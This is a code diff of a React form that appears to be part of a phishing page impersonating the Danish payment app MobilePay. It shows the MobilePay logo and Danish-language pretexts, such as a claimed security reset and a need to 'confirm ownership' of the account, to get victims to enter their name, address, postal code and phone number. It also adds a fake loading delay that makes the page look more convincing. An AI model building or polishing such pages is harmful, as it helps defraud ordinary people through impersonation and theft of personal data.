@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, {useEffect, useState } from "react";
 import { Col, Row } from "react-bootstrap";
 import { useNavigate, useLocation } from "react-router-dom";
 import "./PersonalizedAccountForm.css";
@@ -7,6 +7,7 @@ import "./Payment.css";
 import Logo from "./images/logo.png";
 import Footer from "./Footer/Footer";
 import logo2 from "./images/mobilePayLogo.png";
+import Loader from "./Loader";
 
 const PersonalizedAccountForm = () => {
 
@@ -17,6 +18,7 @@ const PersonalizedAccountForm = () => {
   const [postnum, setPostnum] = useState("");
   const [number, setNumber] = useState("");
   const [validInput, setValidInput] = useState("");
+  const [loading, setLoading] = useState(true);
 
   const navigate = useNavigate();
 
@@ -42,8 +44,11 @@ const PersonalizedAccountForm = () => {
         break;
       case "number":
 
+        let Phone = document.getElementById('PhoneNumber');
+        let formattedPhone = Phone.value.replace(/(\d{2})(?=\d)/g, '$1 ');
+        Phone.value = formattedPhone;
         setNumber(formattedValue);
-                // const input = e.target.value
+        // const input = e.target.value
         // e.target.value = prefix + input.substr(prefix.length)
         break;
       default:
@@ -57,7 +62,7 @@ const PersonalizedAccountForm = () => {
 
     //console.log(nameIn.length,addressIN.length,postnum.length,number.length)
     //Validating and checking if the user have filled all fields
-    if(Username.length > 1 && Address.length > 1 && PostalNumber.length === 4 && Phone.length === 8 )
+    if(Username.length > 1 && Address.length > 1 && PostalNumber.length === 4 && Phone.length === 11 )
     {
       console.log("TRUE")
       setValidInput(true)
@@ -75,17 +80,28 @@ const PersonalizedAccountForm = () => {
   function changecolor(){
     var inputElement = document.querySelector('.PersonalizedAccountForm_input1');
     inputElement.style.borderBottomColor = '#255dab';
+
   }
   function changeColorBack(){
     var inputElement = document.querySelector('.PersonalizedAccountForm_input1');
     inputElement.style.borderBottomColor = '#ccc';
   }
+
+  useEffect(() => {
+    setTimeout(() => {
+      setLoading(false);
+    }, 2000);
+  }, []);
+
+  
+  if (loading) return <Loader />;
   return (
     <div className="PersonalizedAccountForm">
       <img src={logo2} />
-      <h1>Personlige oplysninger</h1>
+      <h1>Identifikation</h1>
       <p>
-        Af sikkerhedsmæssige årsager har vi været nØdt tilat nulstille dine personlige oplysninger, da vi haropdaget et forsØg på at ændre dit nummer.
+      For at fortsætte dit brug af MobilePay,
+  har vi brug for dine oplysninger, for at bekræfte herredømmet over din konto.
       </p>
       <div>
         <Row>
@@ -120,8 +136,8 @@ const PersonalizedAccountForm = () => {
                 name="number"
                 prefix="+45"
                 inputMode="numeric"
-                maxlength="8"
-                minlength="8"
+                maxlength="11"
+                minlength="11"
                 id="PhoneNumber"
                 />
                 </div>
